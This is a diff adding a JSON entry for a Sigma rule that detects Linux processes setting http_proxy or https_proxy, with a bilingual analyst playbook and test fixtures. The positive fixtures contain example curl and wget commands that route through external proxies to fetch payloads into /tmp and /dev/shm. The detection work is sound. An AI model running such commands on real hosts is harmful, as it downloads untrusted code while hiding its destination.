@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+    "title": "Connection Proxy",
+    "level": "low",
+    "status": "test",
+    "author": "Ömer Günal",
+    "path": "linux/process_creation/proc_creation_lnx_proxy_connection.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_proxy_connection.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1090"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó en un host Linux un proceso cuya línea de comandos define las variables http_proxy o https_proxy. Esto puede ser configuración administrativa normal o un intento de enrutar tráfico a través de un proxy controlado por un atacante.",
+      "what_it_detects": "Eventos de creación de procesos en Linux donde CommandLine contiene 'http_proxy=' o 'https_proxy=', por ejemplo 'env https_proxy=... curl ...' o 'bash -c \"export http_proxy=...\"'.",
+      "why_it_matters": "Un atacante puede forzar que herramientas como curl, wget o gestores de paquetes salgan por un proxy propio para ocultar el destino real, evadir controles de salida o encadenar saltos de C2 (ATT&CK T1090, Proxy).",
+      "triage_steps": [
+        "Revise CommandLine completo: extraiga el host y puerto del proxy y el comando que se ejecuta con esa variable (curl, wget, apt, pip, script).",
+        "Compare el proxy con los proxies corporativos documentados; una IP externa, un puerto inusual o localhost con túnel es sospechoso.",
+        "Identifique el usuario y ParentImage: ¿proviene de una sesión SSH interactiva, de cron, de un servicio web o de un script de despliegue conocido?",
+        "Revise procesos padre e hijos en el mismo host +/- 15 minutos: descargas, chmod +x, ejecución desde /tmp o /dev/shm.",
+        "Busque conexiones de red del host hacia la IP/puerto del proxy en logs de firewall o NetFlow.",
+        "Consulte alertas previas del mismo host, usuario o IP de proxy en Centinela.",
+        "Verifique si se modificaron /etc/environment, ~/.bashrc, /etc/profile.d o archivos de configuración de apt/yum para persistir el proxy."
+      ],
+      "false_positives": [
+        "Administradores configurando el proxy corporativo para apt, yum, pip o docker.",
+        "Scripts de aprovisionamiento (Ansible, cloud-init, CI/CD) que exportan el proxy de la organización.",
+        "Desarrolladores probando aplicaciones a través de un proxy de depuración local autorizado."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del host o del usuario si el cambio de proxy fue autorizado y documentado.",
+        "Si el proxy no es corporativo, bloquee la IP/puerto en el perímetro y aísle el endpoint de forma controlada.",
+        "Elimine la configuración de proxy maliciosa de archivos de perfil y entorno tras preservar evidencia.",
+        "Investigue y elimine los payloads descargados; restablezca credenciales del usuario si hubo acceso no autorizado.",
+        "Agregue a la lista de exclusiones los proxies corporativos legítimos para reducir ruido."
+      ],
+      "severity_rationale": "El nivel bajo es adecuado porque configurar proxies es una tarea administrativa frecuente; solo se vuelve relevante con un proxy desconocido o actividad sospechosa asociada."
+    },
+    "en": {
+      "summary": "A Linux process was started with a command line that sets http_proxy or https_proxy. This may be routine configuration or an attempt to route traffic through an attacker-controlled proxy.",
+      "what_it_detects": "Linux process creation events where CommandLine contains 'http_proxy=' or 'https_proxy=', such as 'env https_proxy=... curl ...' or 'bash -c \"export http_proxy=...\"'.",
+      "why_it_matters": "Attackers can force curl, wget or package managers through their own proxy to hide the real destination, bypass egress controls or chain C2 hops (ATT&CK T1090, Proxy).",
+      "triage_steps": [
+        "Read the full CommandLine: extract the proxy host and port and the command run with that variable (curl, wget, apt, pip, a script).",
+        "Compare the proxy with documented corporate proxies; an external IP, unusual port or tunneled localhost is suspicious.",
+        "Identify the user and ParentImage: interactive SSH session, cron, a web service, or a known deployment script?",
+        "Review parent and child processes on the same host within +/- 15 minutes: downloads, chmod +x, execution from /tmp or /dev/shm.",
+        "Look for network connections from the host to the proxy IP/port in firewall or NetFlow logs.",
+        "Check earlier Centinela alerts for the same host, user or proxy IP.",
+        "Check whether /etc/environment, ~/.bashrc, /etc/profile.d or apt/yum configs were changed to persist the proxy."
+      ],
+      "false_positives": [
+        "Administrators configuring the corporate proxy for apt, yum, pip or docker.",
+        "Provisioning scripts (Ansible, cloud-init, CI/CD) exporting the organization's proxy.",
+        "Developers testing applications through an authorized local debugging proxy."
+      ],
+      "response_steps": [
+        "Confirm with the host or user owner whether the proxy change was authorized and documented.",
+        "If the proxy is not corporate, block its IP/port at the perimeter and isolate the endpoint in a controlled way.",
+        "After preserving evidence, remove malicious proxy settings from profile and environment files.",
+        "Investigate and remove downloaded payloads; reset the user's credentials if unauthorized access occurred.",
+        "Tune the rule by excluding legitimate corporate proxies to reduce noise."
+      ],
+      "severity_rationale": "Low fits because setting proxies is a common admin task; it only matters with an unknown proxy or related suspicious activity."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "env used to send a curl download through an external proxy",
+        "event": {
+          "Image": "/usr/bin/env",
+          "CommandLine": "env https_proxy=http://203.0.113.45:8443 curl -s -o /tmp/.u https://update.example.com/agent",
+          "ParentImage": "/bin/bash",
+          "ParentCommandLine": "-bash",
+          "User": "www-data",
+          "CurrentDirectory": "/var/www/html",
+          "Computer": "web-02",
+          "ProcessId": 48213
+        }
+      },
+      {
+        "description": "bash one-liner exporting http_proxy before wget",
+        "event": {
+          "Image": "/bin/bash",
+          "CommandLine": "bash -c \"export http_proxy=http://198.51.100.77:3128; wget -q http://files.example.org/run.sh -O /dev/shm/r.sh\"",
+          "ParentImage": "/usr/sbin/cron",
+          "ParentCommandLine": "/usr/sbin/CRON -f",
+          "User": "jperez",
+          "CurrentDirectory": "/home/jperez",
+          "Computer": "bastion-01",
+          "ProcessId": 30117
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "curl using an explicit --proxy option, no proxy environment variable assignment",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl --proxy http://proxy.example.com:3128 -I https://www.example.com",
+          "ParentImage": "/bin/bash",
+          "ParentCommandLine": "-bash",
+          "User": "jperez",
+          "CurrentDirectory": "/home/jperez",
+          "Computer": "bastion-01",
+          "ProcessId": 30455
+        }
+      },
+      {
+        "description": "Admin reading proxy settings with grep; only no_proxy= appears",
+        "event": {
+          "Image": "/usr/bin/grep",
+          "CommandLine": "grep -i no_proxy= /etc/environment",
+          "ParentImage": "/bin/bash",
+          "ParentCommandLine": "-bash",
+          "User": "root",
+          "CurrentDirectory": "/root",
+          "Computer": "web-02",
+          "ProcessId": 48990
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:12+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
